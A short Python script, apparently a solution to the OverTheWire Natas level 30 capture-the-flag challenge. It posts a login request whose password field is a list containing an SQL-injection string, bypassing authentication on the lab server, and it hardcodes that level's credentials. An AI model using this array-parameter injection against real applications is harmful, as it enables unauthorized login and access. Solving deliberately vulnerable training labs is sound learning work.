import requests
from requests.auth import HTTPBasicAuth
import string



payload = { "username": "natas31", "password": ["'skip' or 1", 4] }
    
   
res = requests.post("http://natas30.natas.labs.overthewire.org", data=payload, auth=HTTPBasicAuth('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e'))
print (res.text) 
       